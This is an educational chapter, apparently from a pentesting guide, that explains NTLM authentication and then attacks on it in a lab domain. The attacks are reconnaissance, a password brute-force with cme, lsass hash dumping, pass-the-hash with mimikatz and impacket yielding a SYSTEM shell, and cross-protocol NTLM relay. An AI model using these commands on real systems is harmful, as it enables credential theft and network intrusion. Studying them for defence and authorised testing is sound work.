# 3. NTLM

## **NTLM Basics**

[NTLM](http://davenport.sourceforge.net/ntlm.html) (NT LAN Manager) is an authentication protocol that can be used by Windows services in order to verify the identity of the client. NTLM is implemented in the [NTLM SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm), and apart from authentication, it also allows to protect the communication by signing and/or encrypting the messages.

Before discuss about NTLM, there are some concepts that it is important to not confuse:

* **NTLM**: The network protocol used to authenticate users in remote machines. It is also known as Net-NTLM.
* **NTLMv1**: The version 1 of NTLM. It is also known as Net-NTLMv1.
* **NTLMv2**: The version 2 of NTLM, it differs from NTLMv1 in the way the session key and NTLM hash is calculated. It is also known as Net-NTLMv2.
* **NTLM2**: Is the NTLMv1 with enhanced security, but still weaker than NTLMv2.
* **NTLM hash/response**: The response to the server challenge, calculated from the NT hash. It is also known as Net-NTLM hash and NTLM response.
* **NTLMv1 hash**: The NTLM hash created by NTLMv1.
* **NTLMv2 hash**: The NTLM hash created by NTLMv2.
* [NT hash](../../04.-users.md#lm-nt-hashes): A hash derivated from the user password, used as secret for the NTLM authentication. It is usually called the NTLM hash, but this name is not correct, since the NTLM hash is the one produced by the NTLM protocol.
* [LM hash](https://en.wikipedia.org/wiki/LAN\_Manager#LM\_hash\_details): The older LAN Manager hash derived from user password, is obsolete and not widely used. Pretty easy to crack.
* **LM Response**: The LM response to the server challenge, by using the LM hash to calculate it. In can be used in conjuction with the NTLM response. This response is obsolete.
* **LMv1**: The version 1 of the LM Response.
* **LMv2**: The version 2 of the LM Response.

The first thing to know is that NTLM is not an isolated protocol that generates network traffic, but must be used embebed in an application protocol, such as **SMB** (INSERT LINK TO SMB), **LDAP** (INSERT LINK TO LDAP) or **HTTP** (INSERT LINK TO HTTP).

Moreover, NTLM can be used in both Active Directory and Workgroups networks. In Active Directory, for domain users, the preferred authentication protocol is Kerberos, but NTLM can be used, whereas computer local users can only be authenticated remotely with NTLM. Therefore, even if [it is possible to disable NTLM in a domain](http://woshub.com/disable-ntlm-authentication-windows/), is [still present in most networks](https://syfuhs.net/killing-ntlm-is-hard) nowadays.

The NTLM authentication is composed by 3 messages/phases: NEGOTIATE, CHALLENGE and AUTHENTICATE.

```bash
# NTLM authentication:
client               server
  |                    |
  |                    |
  |     NEGOTIATE      |
  | -----------------> |
  |                    |
  |     CHALLENGE      |
  | <----------------- |
  |                    |
  |    AUTHENTICATE    |
  | -----------------> |
  |                    |
  |    application     |
  |      messages      |
  | -----------------> |
  | <----------------- |
  | -----------------> |
  |                    |
```

1. Firstly, the client, after initiating the security context, by calling `InitializeSecurityContext` of the NTLM SSP, sends a NEGOTIATE message to the server. It indicates security options, like the NTLM version to use.

![NTLM negotiate message](../../../../.gitbook/assets/ntlm\_negotiate.png)

2\. The server generates a challenge by calling `AcceptSecurityContext` of the NTLM SSP, and sends it to the client within a CHALLENGE message. Also confirms the negotiated options and sends information about its computer name and version and domain name.

![NTLM challenge message](../../../../.gitbook/assets/ntlm\_challenge.png)

3\. The client receives the challenge and pases it to `InitializeSecurityContext` in order to calculate a response by using the client key (NT hash). If it is required, it also creates a session key and encrypts it with a key, known as session base key, derivated from NT hash. The client sends the response and session key back to the server. Also sends [different attributes](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) known as av\_pairs, like information about its computer name and version and domain name and the negotiate flags. Moreover, the message includes a MIC (Message Integrity Code) to avoid tampering.

![NTLM authenticate message](../../../../.gitbook/assets/ntlm\_authenticate.png)

4\. Finally, the server verifies that the challenge response is correct (`AcceptSecurityContext`) and a security session/context is setup. Following messages will be encrypted/signed with the session key.

![Authentication completed](../../../../.gitbook/assets/spnego\_negtokentarg.png)

```bash
# NTLM authentication process
                         client               server
                           |                    |
 AcquireCredentialsHandle  |                    |
           |               |                    |
           v               |                    |
 InitializeSecurityContext |                    |
           |               |     NEGOTIATE      |
           '-------------> | -----------------> | ----------.
                           |     - flags        |           |
                           |                    |           v
                           |                    | AcceptSecurityContext
                           |                    |           |
                           |                    |       challenge
                           |     CHALLENGE      |           |
           .-------------- | <----------------- | <---------'
           |               |   - flags          |
       challenge           |   - challenge      |
           |               |   - server info    |
           v               |                    |
 InitializeSecurityContext |                    |
       |       |           |                    |
    session  response      |                    |
      key      |           |    AUTHENTICATE    |
       '-------'---------> | -----------------> | ------.--------.
                           |   - response       |       |        |
                           |   - session key    |       |        |
                           |     (encrypted)    |   response  session
                           |   - attributes     |       |       key
                           |     + client info  |       |        |
                           |     + flags        |       v        v
                           |   - MIC            | AcceptSecurityContext
                           |                    |           |
                           |                    |           v
                           |                    |           OK
                           |                    |
```

The NTLM authentication process is handled by the NTLM SSP, independently of the application protocol that uses it. Also, it must be notice that in order to proof its identity the client must have a key. The key used in NTLM authentication is the NT hash of the user that acts as client (also LM hash is used in NTLMv1).

Nevertheless, in NTLM, the NT hash is not transmitted over the network, but is only used to calculate the NTLM response to the server challenge and the session key. The NTLM response is also known as the NTLM hash (also called Net-NTLM hash). The calculation of the NTLM hash depends on the version of the NTLM protocol.

{% hint style="info" %}
When NTLM is used, the credentials are not transmitted over the network, so they are not cached in the target machine. Therefore, they cannot be retrieved with [mimikatz](https://github.com/gentilkiwi/mimikatz).
{% endhint %}

Currently there are 2 versions of the NTLM protocol: [NTLMv1](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5) and [NTLMv2](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3). The version to being used [is not negotiated in the transmission](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3) but [must be configured properly in client and server](http://woshub.com/disable-ntlm-authentication-windows/).

However, in the NTLM messages other security parameters are [negotiated](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) like:

* Session signing. Useful to prevent NTLM Relay attacks
* Session sealing\encryption. Not commonly used.
* Generate LM response. In case LM response is not required, it will not be processed by the server.
* Use of NTLMv2 or NTLMv1 session security. The session security is not the authentication version, but an extension to improve the security of NTLMv1 authentication.

Let's see the differences between NTLMv1 and NTLMv2.

### **NTLMv1**

In [NTLMv1](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5), the NTLM response (NTLMv1 hash) to the server challenge is calculated by using the NT hash to encrypt the server challenge with the DES algorithm. The session key is also encrypted with the NT hash directly.

{% hint style="info" %}
NTLMv1 can be used with NTLMv2 Session Security, that is not NTLMv2, but an extension to enhance security of NTLMv1.
{% endhint %}

```bash
# NTLMv1 Authentication:
                    Server                  Client
                   challenge               challenge
                       |           (if NTLMv2 Session Security)
                       |                       |
                       '-----------.-----------'
                                   |
                                   v
             .---> LM hash -->
Password ----|                   NTLMv1
             '---> NT hash -->         
                                   v
                                   |
                   .---------------|----------------.
                   |               |                |
                   v               v                v
             NTv1 Response   LMv1 Response    Session Base Key
             (NTLMv1 Hash)   (LMv1 Hash)
```

### **NTLMv2**

However, in [NTLMv2](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3) more data is taken into to protect the integrity of the AUTHENTICATE message, and therefore, the integrity of the hole session. To calculate the response (NTLM hash), NTLMv2 takes into account:

* The server challenge
* A random generated client challenge
* The current timestamp
* The [AvPairs](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) field that contains information like server domain/hostname or if the Mic is included in the message (MsvAvFlags). (In the docs the AvPairs is documented as the confusing [ServerName field](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3))

```bash
# NTLMv2 Authentication:
                                                          .---
                                                          | - Domain
           Server       Client      Timestamp    AvPairs <  - Dns 
          challenge    challenge        |           |     | - IsMicPresent?
              |            |            |           |     | - Etc...
              |            |            |           |     '---
              '------------'-----.------'-----------'                         
                                 |
                                 v                                          

  Password ---> NT hash ---->  NTLMv2

                                 |
                                 |
                 .---------------|----------------.
                 |               |                |
                 v               v                v
           NTv2 Response   LMv2 Response    Session Base Key
           (NTLMv2 Hash)   (LMv2 Hash)
```

NTLMv2 concatenates all this data and applies an HMAC to calculate the NTLM response, known as NTLMv2 hash. Furthermore, this data is also used to calculate the session key.

### **MIC**

Additionally, to protect the integrity of the hole NTLM negotiation, the AUTHENTICATE message includes a MIC. The [MIC is calculated](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/f9e6fbc4-a953-4f24-b229-ccdcc213b9ec) by applying an HMAC over all the messages of the NTLM process with the session key.

```bash
# MIC calculation:
           NEGOTIATE        CHALLENGE        AUTHENTICATE
               |                |                 |
               '----------------'-----------------'
                                |
                                v
                                
 Exported Session Key ---->  HMAC-MD5

                                |
                                v
                               MIC
```

Hence, the integrity of the 3 messages is preserved. And, in case of the attacker removes the MIC, the authentication will fail, since the NTLMv2 response protects the flag that indicates that MIC is present. Nevertheless, in the past, the MIC has been the target of various investigations that discovered the [_Drop the MIC_](https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/) and [_Drop the MIC 2_](https://www.preempt.com/blog/active-directory-ntlm-attacks/) vulnerabilities.

It must be noted, that NTLMv1 doesn't take into account the NTLM flags to create the response. Therefore, in case of using NTLMv1, an attacker performing a NTLM Relay attack can just remove the MIC (and adjust the flags shown in [_Drop the MIC_](https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/)) of the AUTHENTICATE message to tamper the data and, for instance, disabling the signing of application messages.

### **NTLM in Active Directory**

NTLM can be used both in Workgroups and in Active Directory. In this last case, it allows to authenticate domain accounts in the machines of the network. However, the NT hash is stored in the Active Directory [database](../../08.-database.md), located in the [Domain Controllers](../../06.-computers/1.-domain-controllers.md).

Therefore, in order to verify the AUTHENTICATE message for a domain account, the target machine will send a Netlogon ([NetrLogonSamLogonWithFlags](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/d17f1077-de4b-4fcd-8867-39068cb789f5)) request to the DC asking it to verify the client response to the challenge. The DC verifies this response and returns the necessary information to the machine, such as the session key and user privileges, in order to continue with the application session.

```bash
# NTLM process with domain accounts:
  client            server                          DC
    |                 |                              |
    |                 |                              |
    |    NEGOTIATE    |                              |
    | --------------> |                              |
    |                 |                              |
    |    CHALLENGE    |                              |
    | <-------------- |                              |
    |                 |                              |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |
    | --------------> | ---------------------------> |
    |                 |                              |
    |                 |        ValidationInfo        |
    |                 | <--------------------------- |
    |                 |                              |
    |   application   |                              |
    |    messages     |                              |
    | --------------> |                              |
    |                 |                              |
    | <-------------- |                              |
    |                 |                              |
    | --------------> |                              |
    |                 |                              |
```

Moreover, NTLM can also be used for machines in different domains. In case the account used is from a different domain that the server, it must ask to the DC to verify the AUTHENTICATE message, and the DC in turn must send the AUTHENTICATE message to the DC of the user account domain (by using a [trust](../../03.-trusts.md)) in order to verify it.

```bash
# Inter-domain NTLM process:

  client            server                          DC                      DC
 (it.foo.com)     (foo.com)                      (foo.com)         (it.foo.com)
    |                 |                              |                       |
    |                 |                              |                       |
    |    NEGOTIATE    |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
    |    CHALLENGE    |                              |                       |
    | <-------------- |                              |                       |
    |                 |                              |                       |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |  NetrLogonSamLogonEx  |
    | --------------> | ---------------------------> | --------------------> |
    |                 |                              |                       |
    |                 |      ValidationInfo          |    ValidationInfo     |
    |                 | <--------------------------- | <-------------------- |
    |                 |                              |                       |
    |   application   |                              |                       |
    |    messages     |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
    | <-------------- |                              |                       |
    |                 |                              |                       |
    | --------------> |                              |                       |
    |                 |                              |                       |
```

This way, NTLM can be used in a Active Directory, even if usually Kerberos is used instead since it is the default option in this environment.

{% hint style="info" %}
A trick to force NTLM authentication rather than Kerberos (in Windows built-in utilities) is to connect to the target machine by specifying the IP address instead of the hostname, since Kerberos requires the hostname to identify the machine services.

For example the command `dir \\dc01\C$` will use Kerberos to authenticate against the remote share (LINK TO SHARE) while `dir \\192.168.100.2\C$` will use NTLM.
{% endhint %}

## NTLM Attacks

Now that we know how NTLM works, let's talk about how it can be used in a pentest.

### **NTLM Recon**

NTLM can be useful for reconnaissance, since if the [NTLMSSP\_NEGOTIATE\_TARGET\_INFO](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) flag is sent in the NEGOTIATE message, then the server will return the TargetInfo field populated with [AvPairs](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) in the CHALLENGE message, that contain several information related to the server like its hostname and domain name.

![Server information in NTLM CHALLENGE message](../../../../.gitbook/assets/ntlm\_recon\_wireshark.png)

This information can be useful to identify the machine when we only know its IP and a NTLM-friendly service like SMB or HTTP is available on the server. This can be used to perform reserve name resolution in networks.

{% code title="SMB scan" %}
```bash
ntlm-info smb 192.168.100.0/24

Target: 192.168.100.7
NbComputer: WS02-7
NbDomain: CONTOSO
DnsComputer: ws02-7.contoso.local
DnsDomain: contoso.local
Version: 6.1.7601
OS: Windows 7 | Windows Server 2008 R2

Target: 192.168.100.10
NbComputer: WS01-10
NbDomain: CONTOSO
DnsComputer: ws01-10.contoso.local
DnsDomain: contoso.local
DnsTree: contoso.local
Version: 10.0.19041
OS: Windows 10 | Windows Server 2019 | Windows Server 2016
```
{% endcode %}

It can be used in an internal network, but also from the internet, since some HTTP servers support NTLM, such as [Outlook Web App](https://support.microsoft.com/en-us/office/getting-started-in-outlook-web-app-0062c7be-f8e3-486e-8b14-5c1f793ceefd?ui=en-US\&rs=en-US\&ad=US).

In case of internet this could reveal the name of the internal domain of an organization, that can be useful to know in order to search for keys or password leaks in github or to use it for bruteforcing attacks in VPN gateways panels.

In order to retrieve NTLM information, you can use tools like [NTLMRecon](https://github.com/pwnfoo/NTLMRecon) (can perform HTTP paths bruteforcing) or [ntlm-info](https://gitlab.com/Zer1t0/ntlm-info) (supports HTTP and SMB). You can also identify web endpoints that support NTLM with [the following wordlist](https://gitlab.com/Zer1t0/barrido/-/blob/master/wordlists/ntlm.txt).

### **NTLM brute-force**

Since NTLM is an authentication protocol, it can be use to test the user credentials or to launch a bruteforcing attack, by using any application protocol that supports. Usually SMB (LINK TO SMB-SHARES) is used, since it is available in Windows machines, but others like MSSQL (LINK TO MSSQL) or HTTP (LINK TO HTTP) could be used.

A bruteforce attack with NTLM can be launch with tools like [hydra](https://github.com/vanhauser-thc/thc-hydra), [nmap](https://nmap.org/nsedoc/scripts/smb-brute.html), [cme](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#using-usernamepassword-lists), or [Invoke-Bruteforce.ps1](https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1).

```bash
# Example of NTLM bruteforce attack using cme:
cme smb 192.168.100.10 -u anakin -p passwords.txt 
SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False)
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:1234 STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:Vader! STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [+] contoso.local\anakin:Vader1234! (Pwn3d!)
```

Nevertheless, you should be careful, since testing too much passwords for a single account can block it. In this case the SMB response to the AUTHENTICATE message will contain the code STATUS\_ACCOUNT\_LOCKED\_OUT.

Moreover, launching bruteforce attacks generates a lot of network traffic, specially for Active Directory accounts, since the target machine needs to verify the credentials [against the DC](https://en.hackndo.com/ntlm-relay/#session-key).

Also, bruteforcing attacks of domain accounts can be detected by [Windows-ATA](https://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata) since this solution examines all the traffic that goes to the DCs.

### **Pass the hash**

Another famous technique that uses the NTLM protocol is [Pass-The-Hash](https://en.hackndo.com/pass-the-hash/) (PtH). As you may notice, the NTLM calculates the NTLM hash and session key based on the NT hash of the client/user. Therefore, if an attacker knows the client NT hash it can use this hash to impersonate the client in a NTLM authentication, even if the plain password is unknown.

This attack is pretty relevant nowadays since Microsoft included many protections that prevent tools like [mimikatz](https://github.com/gentilkiwi/mimikatz) from retrieving clear-text passwords [from lsass](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf) process. However, it is still possible to extract the NT hashes for the user accounts, except in case of [credential guard](https://docs.microsoft.com/en-us/archive/blogs/ash/windows-10-device-guard-and-credential-guard-demystified) being enabled (but also can [be byppassed)](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/).

To extract NT hashes from lsass you can use [mimikatz sekurlsa::logonpasswords](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-sekurlsa#logonpasswords) command. Alternatively, you can [dump the lsass process](https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html) with tools like [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper or others](https://lolbas-project.github.io/#/dump), and copy the dump to your local machine to read it with [mimikatz](https://github.com/gentilkiwi/mimikatz), [pypykatz](https://github.com/skelsec/pypykatz) or [read the dump remotely](https://en.hackndo.com/remote-lsass-dump-passwords/) with [lsassy](https://github.com/Hackndo/lsassy).

Furthermore, NT hashes can also be extracted [from the local SAM database](https://www.hackingarticles.in/credential-dumping-sam/) or the [NTDS.dit database in Domain Controllers](https://www.hackingarticles.in/credential-dumping-ntds-dit/).

In Windows machines you may need to [inject the NT hash in a process](https://www.praetorian.com/blog/inside-mimikatz-part1/) with [mimikatz](https://github.com/gentilkiwi/mimikatz) in order to use it to authenticate against remote machines with built-in tools or IT tools like [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Additionally, there are special tools like the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) suite that allows to pass the NT hash as a parameter.

{% code title="Pass-The-Hash with mimikatz" %}
```bash
PS C:\Users\Anakin\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
user    : Administrator
domain  : contoso.local
program : cmd.exe
impers. : no
NTLM    : b73fdfe10e87b4ca5c0d957f81de6863
  |  PID  1080
  |  TID  2664
  |  LSA Process is now R/W
  |  LUID 0 ; 2124820 (00000000:00206c14)
  \_ msv1_0   - data copy @ 000001E6F01AE490 : OK !
  \_ kerberos - data copy @ 000001E6EF86CCD8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001E6F01D7E38 (32) -> null
```
{% endcode %}

{% hint style="info" %}
Notice that when an NT hash (or Kerberos ticket) of other user is injected, this will only allows you to impersonate the other user in remote connections, not in the local computer.
{% endhint %}

On the other part, to perform a Pass-The-Hash from a Linux machine, you can use the [impacket](https://github.com/SecureAuthCorp/impacket) suite, whose scripts accept the NT hash directly as a parameter.

```bash
# Pass-The-Hash with psexec.py of impacket:
psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.100.10.....
[*] Found writable share ADMIN$
[*] Uploading file WFKqIQpM.exe
[*] Opening SVCManager on 192.168.100.10.....
[*] Creating service AoRl on 192.168.100.10.....
[*] Starting service AoRl.....
[!] Press help for extra shell commands
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.
b'Not enough memory resources are available to process this command.\r\n'
C:\Windows\system32>whoami
nt authority\system
```

### NTLM Relay

Let's talk now about one of the most famous attacks that involve NTLM, the [NTLM Relay](https://en.hackndo.com/ntlm-relay/) attack.

> To get more information about NTLM relay attacks, please check the [_NTLM Relay_](https://en.hackndo.com/ntlm-relay/) post, that includes a great [NTLM Relay matrix](https://en.hackndo.com/ntlm-relay/#what-can-be-relayed).

The NTLM Relay attack consist of an attacker that performs a Person-in-The-Middle and takes advantage of its intermediary position to redirect the NTLM authentication to a server of its interest to get an authenticated session.

```bash
# NTLM relay attack:
    client                 attacker               server
      |                       |                     |
      |                       |                -----|--.
      |     NEGOTIATE         |     NEGOTIATE       |  |
      | --------------------> | ------------------> |  |
      |                       |                     |  |
      |     CHALLENGE         |     CHALLENGE       |  |> NTLM Relay
      | <-------------------- | <------------------ |  |
      |                       |                     |  | 
      |     AUTHENTICATE      |     AUTHENTICATE    |  |
      | --------------------> | ------------------> |  |
      |                       |                -----|--'
      |                       |    application      |
      |                       |     messages        |
      |                       | ------------------> |
      |                       |                     |
      |                       | <------------------ |
      |                       |                     |
      |                       | ------------------> |
      |                       |                     |
```

The flaw of the NTLM relay attack is that, even if the attacker is authenticated, it **doesn't know the session key**, which is encrypted in the transmission, and it is needed to sign and/or encrypt (seal) messages. Therefore, if signing is negotiated between client and server, the attacker won't be able to generate valid signatures for the application messages, thus becoming unable to talk with the server, so the attack fails.

However, even if the client and server wants to negotiate signing, the attacker could tamper the messages in order to unset this flags. In order to avoid this, as we have seen, the AUTHENTICATE message includes a [MIC](https://zer1t0.gitlab.io/posts/attacking\_ad/#domain-controllers), that is a signature that takes into account all the NTLM messages. Finally if server checks the MIC and doesn't correspond with the signature of the original messages, it aborts the connection.

Notwithstanding, since it is an optional field, an attacker could also remove the MIC and [change the flags (in the AvPairs)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e) to specify that MIC is not present (it cannot modify the MIC since is calculated with the session key).

Hence, to protect the MIC, NTLMv2 uses the value of the AvPairs (including the MIC flag) included in the AUTHENTICATE message to calculate the challenge response. If the attacker modify the flag that indicates the MIC presence in the AvPairs, then the challenge response checking will fail in the target server and the session will be finished. It should be noted that **NTLMv1 doesn't protect the MIC**, so it is vulnerable to message tampering.

{% hint style="info" %}
As a curiosity, before the [CVE-2015-005](https://www.coresecurity.com/core-labs/advisories/windows-pass-through-authentication-methods-improper-validation), in case of use [NTLM with domain accounts](3.-ntlm.md#ntlm-in-active-directory), an attacker could use the Netlogon call (NetrLogonSamLogonWithFlags) to ask the DC to verify the AUTHENTICATE message and return the session key, so an attacker could use this to bypass the signing restriction.
{% endhint %}

Notwithstanding, this is not the end of the history. NTLM allows to negotiate signing by using the [NTLM flag](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) _NTLMSSP\_NEGOTIATE\_SIGN_. That can be set by client and server. However, that both **set this flag doesn't guarantee that signing is going to be used**. It depends on the application protocol. Also, it is common that there are 3 signing states: Not Supported, Supported, Required.

For example, in the case of SMB (LINK TO SMB-SHARES), it includes its own sign flags ([SecurityMode](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb2/e14db7ff-763a-4263-8b10-0c3944f52fc5)) that determines if the signing is supported/required or not. Therefore, in SMB communications the NTLM flag _NTLMSSP\_NEGOTIATE\_SIGN_ is set to indicate that signing is supported, but it is necessary to check the SMB flags in order to determine if communication is going to be signed. Moreover, this behaviour is different based on the SMB version. Here I will let you a copy of the [SMB signing matrixes](https://en.hackndo.com/ntlm-relay/#signature-matrix).

In case of SMB1 there are 3 signing states: **Disabled**, **Enabled** and **Required**.

#### SMB1 signing matrix

| client\server | Required             | Enabled    | Disabled             |
| ------------- | -------------------- | ---------- | -------------------- |
| Required      | Signed               | Signed     | Signed               |
| Enabled       | Signed (Default DCs) | Signed     | Not Signed (Default) |
| Disabled      | Signed               | Not Signed | Not Signed           |

However, in case of SMB2 signing is always enabled but there are 2 states: Required and Not Required.

#### SMB2 signing matrix

| client\server |       Required       |     Not Required     |
| :-----------: | :------------------: | :------------------: |
|    Required   |        Signed        |        Signed        |
|  Not Required | Signed (Default DCs) | Not Signed (Default) |

As you can see, both in **SMB1 and SMB2, by default the client has the signing Enabled (but not required)**, so the NTLM flag _NTLMSSP\_NEGOTIATE\_SIGN_ is set. However the servers only have the _NTLMSSP\_NEGOTIATE\_SIGN_ flag set in SMB2, with the exception of **DCs that always require SMB signing**. This must be taken into account when performing cross-protocol NTLM relay attack.

Another common protocol that uses NTLM is [LDAP](../../08.-database.md#ldap), that also has three levels of signing: Required, Enabled and Disabled. However, unlike SMB, LDAP protocol doesn't have signing flags, so the negotiation is based on the _NTLMSSP\_NEGOTIATE\_SIGN_ flag of NTLM, that it is set when LDAP is at least supported/enabled. The following matrix identifies the cases:

#### LDAP signing matrix

| client\server | Required      | Enabled          | Disabled      |
| ------------- | ------------- | ---------------- | ------------- |
| Required      | Signed        | Signed           | Not Supported |
| Enabled       | Signed        | Signed (Default) | Not Signed    |
| Disabled      | Not Supported | Not Signed       | Not Signed    |

{% hint style="info" %}
It is possible to [modify the LDAP signing configuration](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server) for both client and server by applying GPOs.
{% endhint %}

As you can see, when both the client and the server have the signing enabled (that means that is supported), the communication is signed. Besides, it must be taken into account that **DCs do not enforce LDAP signing by default**, so a client can establish an unsigned session with a DC.

This should be enough information to deduce that a cross-protocol relay attack can be performed from LDAP to SMB2 (in the default case), but not SMB2 to LDAP.

```bash
# Cross-protocol NTLM Relay from SMB2 to LDAP (default case):

    client <-----SMB2----> attacker <----LDAP---> server
      |                       |                     |
      |                       |                -----|--.
      |   NEGOTIATE SIGN=1    |  NEGOTIATE SIGN=1   |  |
      | --------------------> | ------------------> |  |
      |                       |                     |  |
      |   CHALLENGE SIGN=1    |  CHALLENGE SIGN=1   |  |> NTLM Relay
      | <-------------------- | <------------------ |  |
      |                       |                     |  | 
      |  AUTHENTICATE SIGN=1  | AUTHENTICATE SIGN=1 |  |
      | --------------------> | ------------------> | -|---> MIC OK!! 
      |                       |                -----|--'
      |                       |         ||          |
      |                       |         vv          |
      |                       |    client SIGN = 1  |
      |                       |    server SIGN = 1  |
      |                       |         ||          |
      |                       |         vv          |
      |                       |   Signing required  |
      |                       |    Attack failed    |
      |                       |                     |
```

As we seen earlier, SMB2 always set the _NTLMSSP\_NEGOTIATE\_SIGN_, therefore, if we relay this NTLM messages to a LDAP server that supports signing, then signing is negotiated and the attack fails. Remember that NTLM messages cannot be tampered since MIC is protecting then (in NTLMv2).

In the contrary case and attacker can negotiate with the SMB2 server that signing is not required by using the SMB headers and relay the LDAP NTLM messages, that by default sets the _NTLMSSP\_NEGOTIATE\_SIGN_ flag. Once the NTLM negotiation is finished, since signing is not used in SMB if it is not required, the session will not require signing, so the attack success. However, this attack is not possible against DCs since by default they require signing.

```bash
# Cross-protocol NTLM Relay from SMB2 to LDAP (default case):
    client <-----LDAP----> attacker <------SMB2------> server (Non DC)
      |                       |
      |     LDAP request      |                          |
      | --------------------> |                          |
      |                       |                          |
      |     LDAP response     |                          |
      | <-------------------- |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE REQUEST  |
      |                       | -----------------------> |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                          |
      |                       |  SMB2 NEGOTIATE RESPONSE |
      |                       | <----------------------- |
      |                       |  SMB SIGN_REQUIRED = 0   |  
      |                       |                          |
      |                       |                     -----|--.
      |   NEGOTIATE SIGN=1    |     NEGOTIATE SIGN=1     |  |
      | --------------------> | -----------------------> |  |
      |                       |                          |  |
      |                       |                          |  |
      |   CHALLENGE SIGN=1    |     CHALLENGE SIGN=1     |  |> NTLM Relay
      | <-------------------- | <----------------------- |  |
      |                       |                          |  |
      |                       |                          |  | 
      |  AUTHENTICATE SIGN=1  |   AUTHENTICATE SIGN=1    |  |
      | --------------------> | -----------------------> | -|---> MIC OK!!
      |                       |                     -----|--'
      |                       |         ||               |
      |                       |         vv               |
      |                       | client SIGN_REQUIRED = 0 |
      |                       | server SIGN_REQUIRED = 0 |
      |                       |         ||               |
      |                       |         vv               |
      |                       |  Signing NOT required    |
      |                       |   Successful Attack!!    |
      |                       |                          |
      |                       |    application           |
      |                       |     messages             |
      |                       | -----------------------> |
      |                       |                          |
      |                       | <----------------------- |
      |                       |                          |
      |                       | -----------------------> |
      |                       |                          |
```

Actually, the SMB2 protocol can be relayed against itself:

```bash
# SMB2 NTLM Relay (default case):
 client <------SMB2-----> attacker <------SMB2------> server (Non DC)
   |                          |                          |
   | SMB2 NEGOTIATE REQUEST   |  SMB2 NEGOTIATE REQUEST  |
   | -----------------------> | -----------------------> |
   |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |
   |                          |                          |
   |                          |                          |
   | SMB2 NEGOTIATE RESPONSE  |  SMB2 NEGOTIATE RESPONSE |
   | <----------------------- | <----------------------- |
